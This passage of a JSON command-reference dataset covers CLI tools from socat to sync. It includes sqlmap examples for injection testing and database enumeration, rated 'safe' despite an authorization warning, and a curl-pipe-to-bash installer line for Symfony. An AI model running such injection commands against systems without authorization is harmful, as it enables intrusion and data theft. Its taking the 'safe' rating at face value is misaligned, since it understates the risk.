        "reason": "SSH can also create tunnels with better security"
      }
    ],
    "warnings": [
      "Complex syntax with many address types",
      "Powerful but can be security risk if misconfigured",
      "May not be installed by default"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/socat.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/socat.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/socat.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sonarqube",
    "subtitle": "SonarQube",
    "description": "Code quality and security analysis platform",
    "examples": [
      "sonar-scanner  # Run SonarQube analysis on current project",
      "mvn clean verify sonar:sonar  # Run Maven build with SonarQube analysis",
      "gradle sonarqube  # Run Gradle build with SonarQube analysis",
      "sonar-scanner -Dsonar.projectKey=myproject -Dsonar.sources=src  # Run analysis with custom project configuration"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sonar-scanner [options] or mvn sonar:sonar",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "CI/CD quality gate",
        "commands": "mvn clean test sonar:sonar && sonar-quality-gate-check",
        "explanation": "Run tests, analyze code, and check quality gate",
        "title": "mvn && sonar"
      }
    ],
    "relatedCommands": [
      {
        "name": "eslint",
        "relationship": "complementary",
        "reason": "ESLint focuses on JavaScript linting"
      },
      {
        "name": "checkstyle",
        "relationship": "complementary",
        "reason": "Checkstyle focuses on Java code style"
      }
    ],
    "warnings": [
      "Requires SonarQube server to be running",
      "Comprehensive analysis including security vulnerabilities",
      "Quality gates can block deployments based on metrics"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.sonarqube.org/latest/"
      },
      {
        "platform": "macos",
        "url": "https://docs.sonarqube.org/latest/"
      },
      {
        "platform": "windows",
        "url": "https://docs.sonarqube.org/latest/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sort",
    "subtitle": "sort",
    "description": "Sort lines of text files",
    "examples": [
      "sort names.txt  # Sort lines in alphabetical order",
      "sort -n numbers.txt  # Sort numerically instead of lexically",
      "sort -r file.txt  # Sort in descending/reverse order",
      "sort -k2,2 data.txt  # Sort by second column only",
      "sort -t',' -k3,3n sales.csv  # Sort CSV by third column numerically",
      "sort -u file.txt  # Sort and remove duplicate lines"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "sort [options] [file]...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find most frequent items",
        "commands": "sort data.txt | uniq -c | sort -nr",
        "explanation": "Sort, count duplicates, then sort by count descending",
        "title": "sort | uniq | sort"
      },
      {
        "scenario": "Sort by file sizes",
        "commands": "ls -la | sort -k5,5n",
        "explanation": "List files sorted by size (5th column)",
        "title": "ls | sort"
      }
    ],
    "relatedCommands": [
      {
        "name": "uniq",
        "relationship": "combo",
        "reason": "Often used together to find unique/duplicate lines"
      },
      {
        "name": "cut",
        "relationship": "combo",
        "reason": "Extract specific columns before sorting"
      },
      {
        "name": "head",
        "relationship": "combo",
        "reason": "Show top N items after sorting"
      }
    ],
    "warnings": [
      "Default sort is lexical, use -n for numeric sorting",
      "Locale settings affect sort order",
      "Memory usage can be high for very large files"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/sort.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/sort.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/sort-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "source",
    "subtitle": "Source",
    "description": "Execute commands from file in current shell context",
    "examples": [
      "source ~/.bashrc  # Reload bash configuration in current session",
      "source .env  # Load environment variables from file",
      "source venv/bin/activate  # Activate Python virtual environment",
      "source functions.sh  # Load shell functions from file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "source filename [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Environment setup workflow",
        "commands": "source ~/.bashrc && source .env && python app.py",
        "explanation": "Load shell config, environment variables, then run app",
        "title": "source && source && python"
      }
    ],
    "relatedCommands": [
      {
        "name": "export",
        "relationship": "combo",
        "reason": "source often loads files with export statements"
      },
      {
        "name": "bash",
        "relationship": "alternative",
        "reason": "bash script.sh runs in subshell vs source in current shell"
      }
    ],
    "warnings": [
      "Changes affect current shell session",
      "Dot (.) is alias for source in many shells"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/source.html"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sox",
    "subtitle": "Sound eXchange",
    "description": "Sound processing library for audio file manipulation",
    "examples": [
      "sox input.wav output.mp3  # Convert WAV audio file to MP3 format",
      "sox input.wav output.wav trim 30 60  # Extract 60 seconds starting from 30 seconds",
      "sox input.wav output.wav vol 0.5  # Reduce volume to 50% of original",
      "sox input.wav output.wav fade 2 0 3  # Add 2-second fade-in and 3-second fade-out",
      "sox input.wav output.wav norm -3  # Normalize audio with -3dB headroom",
      "sox -n tone.wav synth 5 sine 440  # Generate 5-second 440Hz sine wave (A note)",
      "sox --info audio.wav  # Display audio file properties"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sox [global-options] [input] [output] [effect]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete audio processing pipeline",
        "commands": "sox input.wav - norm -1 | sox - output.wav fade 1 0 2",
        "explanation": "Normalize then apply fade effects using pipe",
        "title": "sox | sox"
      },
      {
        "scenario": "Batch process audio files",
        "commands": "for f in *.wav; do sox \"$f\" \"processed_$f\" norm fade 0.5; done",
        "explanation": "Normalize and fade all WAV files in directory",
        "title": "for ; do ; done"
      }
    ],
    "relatedCommands": [
      {
        "name": "ffmpeg",
        "relationship": "alternative",
        "reason": "ffmpeg can also process audio files"
      },
      {
        "name": "audacity",
        "relationship": "alternative",
        "reason": "GUI audio editor with similar capabilities"
      },
      {
        "name": "lame",
        "relationship": "combo",
        "reason": "LAME encoder used by SoX for MP3 output"
      }
    ],
    "warnings": [
      "Format support depends on compile-time options",
      "Some effects chain order affects final result",
      "MP3 encoding requires LAME library"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "http://sox.sourceforge.net/sox.html"
      },
      {
        "platform": "macos",
        "url": "http://sox.sourceforge.net/sox.html"
      },
      {
        "platform": "windows",
        "url": "http://sox.sourceforge.net/sox.html"
      },
      {
        "platform": "generic",
        "url": "http://sox.sourceforge.net/Docs/Documentation"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sqlite3",
    "subtitle": "SQLite",
    "description": "Command-line interface for SQLite databases",
    "examples": [
      "sqlite3 database.db  # Open database file for interactive SQL commands",
      "sqlite3 newdb.sqlite  # Create new SQLite database file",
      "sqlite3 database.db < script.sql  # Run SQL commands from file against database",
      "sqlite3 database.db 'SELECT * FROM users;'  # Run one SQL query and exit",
      "sqlite3 database.db .dump > backup.sql  # Export entire database as SQL statements",
      "sqlite3 database.db '.mode csv' '.import data.csv users'  # Import CSV file into users table"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sqlite3 [options] [database]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Analyze database structure",
        "commands": "sqlite3 database.db '.schema' && sqlite3 database.db '.tables'",
        "explanation": "Show database schema and list all tables",
        "title": "sqlite3 && sqlite3"
      },
      {
        "scenario": "Backup and compress database",
        "commands": "sqlite3 database.db .dump | gzip > backup-$(date +%Y%m%d).sql.gz",
        "explanation": "Create compressed SQL backup with date",
        "title": "sqlite3 | gzip > backup"
      }
    ],
    "relatedCommands": [
      {
        "name": "mysql",
        "relationship": "similar",
        "reason": "Another SQL database client"
      },
      {
        "name": "psql",
        "relationship": "similar",
        "reason": "PostgreSQL client with similar functionality"
      },
      {
        "name": "csvkit",
        "relationship": "combo",
        "reason": "Tools for working with CSV data and databases"
      }
    ],
    "warnings": [
      "Database file created automatically if doesn't exist",
      "Dot commands (.tables, .schema) are SQLite-specific",
      "No user authentication - file permissions control access"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://sqlite.org/cli.html"
      },
      {
        "platform": "macos",
        "url": "https://sqlite.org/cli.html"
      },
      {
        "platform": "windows",
        "url": "https://sqlite.org/cli.html"
      },
      {
        "platform": "generic",
        "url": "https://sqlite.org/docs.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sqlmap",
    "subtitle": "SQL Map",
    "description": "SQL injection detection and exploitation tool for web application security testing",
    "examples": [
      "sqlmap -u 'http://example.com/page.php?id=1'  # Test GET parameter for SQL injection vulnerabilities",
      "sqlmap -u 'http://example.com/login.php' --data='user=admin&pass=test'  # Test POST parameters for SQL injection",
      "sqlmap -u 'http://example.com/page.php?id=1' --dbs  # Enumerate available databases after confirming injection",
      "sqlmap -u 'http://example.com/page.php' --cookie='sessionid=abc123'  # Test cookie parameters for SQL injection"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sqlmap [options] -u <URL>",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive web app SQL testing",
        "commands": "sqlmap -u 'http://target.com/app.php?id=1' --batch --risk=2 --level=3",
        "explanation": "Automated testing with increased risk and thoroughness",
        "title": "sqlmap"
      }
    ],
    "relatedCommands": [
      {
        "name": "owasp-zap",
        "relationship": "combo",
        "reason": "Comprehensive web application security testing"
      },
      {
        "name": "burpsuite",
        "relationship": "combo",
        "reason": "Web application security testing platform"
      }
    ],
    "warnings": [
      "Only use against applications you own or have permission to test",
      "Can cause database damage or data corruption",
      "May be detected by web application firewalls"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://sqlmap.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ss",
    "subtitle": "Socket Statistics",
    "description": "Modern utility to investigate sockets and network connections",
    "examples": [
      "ss -tuln  # Show all TCP and UDP listening ports with numbers",
      "ss -t state established  # Show only established TCP connections",
      "ss -tulnp  # Show listening ports with process information",
      "ss -tuln sport = :80  # Show connections on port 80",
      "ss -m  # Display socket memory usage information",
      "ss -s  # Display socket usage summary"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "ss [options] [filter]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network service audit",
        "commands": "ss -tulnp | grep LISTEN | sort -k5",
        "explanation": "Show all listening services sorted by port",
        "title": "ss | grep | sort"
      }
    ],
    "relatedCommands": [
      {
        "name": "netstat",
        "relationship": "modern-replacement",
        "reason": "ss is faster and more detailed replacement for netstat"
      },
      {
        "name": "lsof",
        "relationship": "similar",
        "reason": "lsof can also show network connections"
      }
    ],
    "warnings": [
      "Filter syntax differs from netstat",
      "More detailed output than netstat",
      "May not be available on older systems"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/ss.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ss.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man8/ss.8.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ssh",
    "subtitle": "secure shell",
    "description": "Secure Shell for remote server access and file transfer",
    "examples": [
      "ssh user@192.168.1.100  # Login to remote server with username and IP",
      "ssh -i ~/.ssh/private_key user@server.com  # Authenticate using specific private key file",
      "ssh user@server 'df -h'  # Run command on remote server and see output locally",
      "ssh -L 8080:localhost:3000 user@server  # Access remote service locally via port forwarding",
      "ssh -p 2222 user@server.com  # Connect to SSH server running on non-standard port"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "ssh [options] <user@host>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Generate and deploy SSH key",
        "commands": "ssh-keygen -t rsa -b 4096 && ssh-copy-id user@server",
        "explanation": "Create new SSH key pair and install public key on server",
        "title": "ssh && ssh"
      },
      {
        "scenario": "Persistent connection with tmux",
        "commands": "ssh user@server -t 'tmux attach || tmux new-session'",
        "explanation": "Connect and attach to persistent terminal session",
        "title": "ssh || tmux"
      }
    ],
    "relatedCommands": [
      {
        "name": "scp",
        "relationship": "similar",
        "reason": "Copy files over SSH connection"
      },
      {
        "name": "rsync",
        "relationship": "similar",
        "reason": "Sync files/directories over SSH"
      },
      {
        "name": "ssh-keygen",
        "relationship": "combo",
        "reason": "Generate SSH keys for authentication"
      }
    ],
    "warnings": [
      "SSH keys are more secure than passwords",
      "Default port 22 may be blocked by firewalls",
      "Connection can timeout if idle too long"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ssh.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ssh.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview"
      }
    ],
    "distroNotes": {
      "windows": "Built into Windows 10+ or available via OpenSSH"
    }
  },
  {
    "name": "ssh-keygen",
    "subtitle": "SSH key generator",
    "description": "Generate SSH authentication key pairs",
    "examples": [
      "ssh-keygen  # Create RSA key pair with interactive prompts",
      "ssh-keygen -t ed25519 -C 'user@example.com'  # Create modern Ed25519 key with comment",
      "ssh-keygen -t rsa -b 4096 -N '' -f ~/.ssh/id_rsa_nopass  # Create 4096-bit RSA key without password for automation",
      "ssh-keygen -p -f ~/.ssh/id_rsa  # Change passphrase for existing private key",
      "ssh-keygen -lf ~/.ssh/id_rsa.pub  # Display fingerprint of public key",
      "ssh-keygen -e -f ~/.ssh/id_rsa.pub  # Export public key in RFC4716 format"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "ssh-keygen [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Generate and deploy key",
        "commands": "ssh-keygen -t ed25519 -f ~/.ssh/server_key && ssh-copy-id -i ~/.ssh/server_key user@server",
        "explanation": "Generate key and install public key on remote server",
        "title": "ssh && ssh"
      },
      {
        "scenario": "Verify key matches",
        "commands": "ssh-keygen -lf ~/.ssh/id_rsa.pub && ssh user@server 'ssh-keygen -lf ~/.ssh/authorized_keys'",
        "explanation": "Compare local and remote key fingerprints",
        "title": "ssh && ssh"
      }
    ],
    "relatedCommands": [
      {
        "name": "ssh-copy-id",
        "relationship": "combo",
        "reason": "Deploy public keys generated by ssh-keygen"
      },
      {
        "name": "ssh-add",
        "relationship": "combo",
        "reason": "Add private keys to SSH agent"
      },
      {
        "name": "ssh",
        "relationship": "combo",
        "reason": "Use keys generated by ssh-keygen for authentication"
      }
    ],
    "warnings": [
      "Default saves to ~/.ssh/id_rsa unless -f specified",
      "Public key (.pub) is safe to share, private key is secret",
      "Ed25519 keys are preferred over RSA for new installations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/ssh-keygen.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ssh-keygen.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement"
      },
      {
        "platform": "generic",
        "url": "https://www.openssh.com/manual.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in Windows 10+ or WSL"
    }
  },
  {
    "name": "sslscan",
    "subtitle": "SSL Scanner",
    "description": "SSL/TLS configuration scanner for security assessment",
    "examples": [
      "sslscan example.com:443  # Scan SSL/TLS configuration and cipher suites",
      "sslscan --xml=report.xml example.com  # Generate XML report of SSL scan results",
      "sslscan --tlsall example.com  # Test all TLS protocol versions",
      "sslscan --show-certificate example.com  # Display detailed certificate information"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sslscan [options] <host:port>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Batch SSL testing",
        "commands": "for host in $(cat hosts.txt); do sslscan --xml=${host}.xml $host; done",
        "explanation": "Scan multiple hosts and generate individual reports",
        "title": "for ; do ; done"
      }
    ],
    "relatedCommands": [
      {
        "name": "testssl",
        "relationship": "similar",
        "reason": "Alternative comprehensive SSL testing tool"
      },
      {
        "name": "nmap",
        "relationship": "combo",
        "reason": "nmap has SSL-related NSE scripts"
      }
    ],
    "warnings": [
      "May not detect all SSL vulnerabilities",
      "Output format may vary between versions",
      "Some firewalls may block or limit scanning"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://github.com/rbsec/sslscan"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "stat",
    "subtitle": "status/statistics",
    "description": "Display detailed file system information",
    "examples": [
      "stat file.txt  # Display size, permissions, timestamps, and inode info",
      "stat -f .  # Display filesystem statistics for current directory",
      "stat -c '%n %s %y' *.txt  # Show filename, size, and modification time",
      "stat -L symlink  # Show information about link target, not the link itself",
      "stat -t file.txt  # Terse format suitable for parsing by scripts"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "stat [options] <file>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Compare file timestamps",
        "commands": "stat -c '%Y' file1.txt file2.txt | sort -n",
        "explanation": "Compare modification timestamps of files",
        "title": "stat | sort"
      },
      {
        "scenario": "Find files by inode",
        "commands": "INODE=$(stat -c %i file.txt) && find . -inum $INODE",
        "explanation": "Find all hard links to a file using its inode",
        "title": "INODE && find"
      }
    ],
    "relatedCommands": [
      {
        "name": "ls",
        "relationship": "similar",
        "reason": "ls shows basic file info, stat shows detailed info"
      },
      {
        "name": "file",
        "relationship": "combo",
        "reason": "file shows type, stat shows metadata"
      },
      {
        "name": "find",
        "relationship": "combo",
        "reason": "Use stat info for find criteria"
      }
    ],
    "warnings": [
      "Format options differ between GNU and BSD stat",
      "Timestamps shown in different formats on different systems",
      "Some information requires elevated privileges"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/stat.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/stat.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/stat-invocation.html"
      }
    ],
    "distroNotes": {
      "macos": "BSD stat - different options than GNU stat",
      "windows": "Available in WSL"
    }
  },
  {
    "name": "steamcmd",
    "subtitle": "Steam Command Line",
    "description": "Steam Console Client for Steam Workshop and game server management",
    "examples": [
      "steamcmd +login anonymous +app_update 740 +quit  # Downloads and updates CS:GO dedicated server files",
      "steamcmd +login username password +force_install_dir ./gameserver +app_update 232250 +quit  # Installs TF2 dedicated server to specified directory",
      "steamcmd +login anonymous +workshop_download_item 107410 123456789 +quit  # Downloads specific Workshop item for Arma 3"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "steamcmd +[commands] +quit",
    "prerequisites": [
      "steam-account-optional"
    ],
    "commandCombinations": [
      {
        "scenario": "Install and configure game server",
        "commands": "steamcmd +login anonymous +force_install_dir ./server +app_update 740 +quit && ./server/srcds_run -game csgo +map de_dust2",
        "explanation": "Downloads CS:GO server files and starts server with de_dust2 map",
        "title": "steamcmd &&"
      },
      {
        "scenario": "Update multiple game servers",
        "commands": "steamcmd +login username password +app_update 740 +app_update 232250 +quit",
        "explanation": "Updates both CS:GO and TF2 servers in single session",
        "title": "steamcmd"
      }
    ],
    "relatedCommands": [
      {
        "name": "srcds_run",
        "relationship": "complement",
        "reason": "Source Dedicated Server runner used after downloading with SteamCMD"
      },
      {
        "name": "steam",
        "relationship": "related",
        "reason": "Steam client alternative for game management"
      }
    ],
    "warnings": [
      "Anonymous login has limited access to some content",
      "Steam Guard may interfere with automated logins",
      "Network interruptions can corrupt downloads",
      "Some apps require specific login credentials"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://developer.valvesoftware.com/wiki/SteamCMD"
      },
      {
        "platform": "macos",
        "url": "https://developer.valvesoftware.com/wiki/SteamCMD"
      },
      {
        "platform": "windows",
        "url": "https://developer.valvesoftware.com/wiki/SteamCMD"
      },
      {
        "platform": "generic",
        "url": "https://steamcommunity.com/sharedfiles/filedetails/?id=2190463014"
      }
    ],
    "distroNotes": {
      "linux": "Requires 32-bit compatibility libraries on 64-bit systems",
      "windows": "Available as direct download from Valve",
      "macos": "Available but with limited game server support"
    }
  },
  {
    "name": "strace",
    "subtitle": "System Call Trace",
    "description": "Trace system calls and signals",
    "examples": [
      "strace ./myprogram  # Trace all system calls made by program",
      "strace -e trace=open,read,write ./myprogram  # Trace only file I/O related system calls",
      "strace -p 1234  # Attach to and trace running process by PID",
      "strace -o trace.log ./myprogram  # Save system call trace to file",
      "strace -T ./myprogram  # Display time spent in each system call",
      "strace -f ./myprogram  # Follow and trace child processes created by program"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "strace [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Debug file access issues",
        "commands": "strace -e trace=file ./myprogram 2>&1 | grep -i error",
        "explanation": "Trace file operations and filter for errors",
        "title": "strace >& 1 | grep"
      }
    ],
    "relatedCommands": [
      {
        "name": "ltrace",
        "relationship": "similar",
        "reason": "ltrace traces library calls instead of system calls"
      },
      {
        "name": "gdb",
        "relationship": "complementary",
        "reason": "gdb provides source-level debugging"
      }
    ],
    "warnings": [
      "Can generate large amounts of output",
      "May slow down traced programs significantly",
      "Some system calls may not be traceable"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/strace.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/strace.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "suricata",
    "subtitle": "Suricata",
    "description": "High-performance network intrusion detection and prevention system",
    "examples": [
      "suricata -c /etc/suricata/suricata.yaml -i eth0  # Run Suricata IDS on network interface",
      "suricata -c /etc/suricata/suricata.yaml -r capture.pcap  # Analyze pcap file with Suricata rules",
      "suricata -T -c /etc/suricata/suricata.yaml  # Test Suricata configuration",
      "suricata-update  # Update Suricata rule sets"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "suricata [options] -c <config-file>",
    "prerequisites": [
      "expert"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete IDS setup",
        "commands": "suricata-update && suricata -T -c /etc/suricata/suricata.yaml && suricata -c /etc/suricata/suricata.yaml -i eth0 -D",
        "explanation": "Update rules, test config, and run as daemon",
        "title": "suricata && suricata && suricata"
      }
    ],
    "relatedCommands": [
      {
        "name": "snort",
        "relationship": "similar",
        "reason": "Alternative network IDS/IPS system"
      },
      {
        "name": "zeek",
        "relationship": "similar",
        "reason": "Network security monitoring platform"
      }
    ],
    "warnings": [
      "Requires adequate system resources for high-speed networks",
      "Rule tuning needed to reduce false positives",
      "Multi-threading configuration affects performance"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://suricata.readthedocs.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "swagger-codegen",
    "subtitle": "Swagger Code Generator",
    "description": "Swagger Codegen for generating client libraries and server stubs",
    "examples": [
      "swagger-codegen generate -i api.yaml -l javascript -o ./client  # Generates JavaScript client library from OpenAPI specification",
      "swagger-codegen generate -i api.yaml -l python-flask -o ./server  # Creates Python Flask server stub from API specification"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "swagger-codegen generate [options]",
    "prerequisites": [
      "java"
    ],
    "commandCombinations": [],
    "relatedCommands": [
      {
        "name": "openapi-generator",
        "relationship": "successor",
        "reason": "Community-driven fork with more features and active development"
      }
    ],
    "warnings": [
      "Requires valid OpenAPI/Swagger specification file",
      "Generated code may need customization",
      "Different languages have different feature support",
      "Output directory must exist or be creatable"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://swagger.io/tools/swagger-codegen/"
      },
      {
        "platform": "macos",
        "url": "https://swagger.io/tools/swagger-codegen/"
      },
      {
        "platform": "windows",
        "url": "https://swagger.io/tools/swagger-codegen/"
      },
      {
        "platform": "generic",
        "url": "https://github.com/swagger-api/swagger-codegen"
      }
    ],
    "distroNotes": {
      "linux": "Requires Java, available through package managers or direct download",
      "windows": "Requires Java, available through direct download",
      "macos": "Available through Homebrew or direct download"
    }
  },
  {
    "name": "syft",
    "subtitle": "Syft",
    "description": "Generate Software Bill of Materials (SBOM) from container images and filesystems",
    "examples": [
      "syft myregistry/myapp:v1.0.0  # Create software bill of materials for container image",
      "syft myregistry/myapp:v1.0.0 -o spdx-json  # Output SBOM in SPDX JSON format",
      "syft myregistry/myapp:v1.0.0 -o cyclonedx-json  # Output SBOM in CycloneDX JSON format",
      "syft dir:/path/to/project -o json  # Generate SBOM from local filesystem directory",
      "syft docker-archive:image.tar  # Generate SBOM from Docker image tarball",
      "syft myregistry/myapp:v1.0.0 -o spdx-json > sbom.json  # Generate SBOM and save to file",
      "syft myregistry/myapp:v1.0.0 --scope all-layers  # Scan all layers including base image packages",
      "syft myregistry/myapp:v1.0.0 -q -o json  # Generate SBOM with minimal logging output"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "syft [source] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "SBOM generation and signing",
        "commands": "syft myregistry/myapp:v1.0.0 -o spdx-json > sbom.spdx.json && cosign attest --predicate sbom.spdx.json --type spdxjson --key cosign.key myregistry/myapp:v1.0.0",
        "explanation": "Generate SBOM and attach it as attestation to image",
        "title": "syft > sbom && cosign"
      },
      {
        "scenario": "Multi-format SBOM export",
        "commands": "syft myregistry/myapp:v1.0.0 -o spdx-json > sbom.spdx.json && syft myregistry/myapp:v1.0.0 -o cyclonedx-json > sbom.cyclonedx.json",
        "explanation": "Generate SBOMs in multiple standard formats",
        "title": "syft > sbom && syft > sbom"
      }
    ],
    "relatedCommands": [
      {
        "name": "grype",
        "relationship": "combo",
        "reason": "Grype uses Syft SBOMs for vulnerability scanning"
      },
      {
        "name": "cosign",
        "relationship": "combo",
        "reason": "Cosign can attach Syft SBOMs as attestations"
      }
    ],
    "warnings": [
      "Different package managers detected automatically",
      "SBOM accuracy depends on package manager metadata quality",
      "Large images may take significant time to analyze",
      "Some package types require specific analysis configuration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/anchore/syft"
      },
      {
        "platform": "macos",
        "url": "https://github.com/anchore/syft"
      },
      {
        "platform": "windows",
        "url": "https://github.com/anchore/syft"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "symfony",
    "subtitle": "Symfony Console",
    "description": "Symfony PHP framework console tool",
    "examples": [
      "symfony new my_project  # Create new Symfony application",
      "symfony server:start  # Start local development server with TLS support",
      "symfony check:requirements  # Verify system meets Symfony requirements",
      "curl -sS https://get.symfony.com/cli/installer | bash  # Download and install Symfony CLI tool",
      "symfony console cache:clear  # Run Symfony console command through CLI"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "symfony <command> [options] [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup new API project",
        "commands": "symfony new api --version=6.1 && cd api && composer require api",
        "explanation": "Create Symfony 6.1 project and add API platform",
        "title": "symfony && cd && composer"
      }
    ],
    "relatedCommands": [
      {
        "name": "composer",
        "relationship": "combo",
        "reason": "Used for managing Symfony dependencies"
      },
      {
        "name": "php",
        "relationship": "underlying",
        "reason": "Symfony runs on PHP"
      }
    ],
    "warnings": [
      "Symfony CLI is separate from Symfony framework console",
      "Local server requires recent version of PHP",
      "Different Symfony versions have different requirements"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://symfony.com/doc/current/setup.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sync",
    "subtitle": "Synchronize",
    "description": "Synchronize cached writes to persistent storage",
    "examples": [
      "sync  # Force all cached filesystem writes to disk",
      "sync /mnt/usb  # Sync only data for specific filesystem",
      "sync important_file.txt  # Ensure specific file is written to disk"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sync [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe system shutdown preparation",
        "commands": "sync && sync && sync",
        "explanation": "Traditional triple-sync before shutdown (mostly historical)",
        "title": "sync && &&"
      }
    ],
    "relatedCommands": [
      {
        "name": "umount",
        "relationship": "recommended",
        "reason": "sync before umount ensures data integrity"
      },
      {
        "name": "fsync",
